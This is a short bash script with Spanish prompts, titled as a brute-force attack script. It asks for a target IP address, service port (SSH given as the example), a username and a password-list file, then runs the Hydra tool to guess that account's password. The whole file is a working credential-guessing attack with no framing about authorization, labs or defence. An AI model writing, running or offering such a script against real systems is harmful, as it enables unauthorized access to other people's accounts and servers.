#!/bin/bash

echo "Script de Ataque de Fuerza Bruta con Hydra"
echo "-------------------------------------------"

read -p "Ingresa la dirección IP del objetivo: " target_ip
read -p "Ingresa el puerto del servicio (ej. 22 para SSH): " target_port
read -p "Ingresa el nombre de usuario objetivo: " username
read -p "Ingresa la ruta del archivo de contraseñas: " password_list

# Comando para realizar el ataque de fuerza bruta con Hydra
hydra -l $username -P $password_list $target_ip -s $target_port -vV
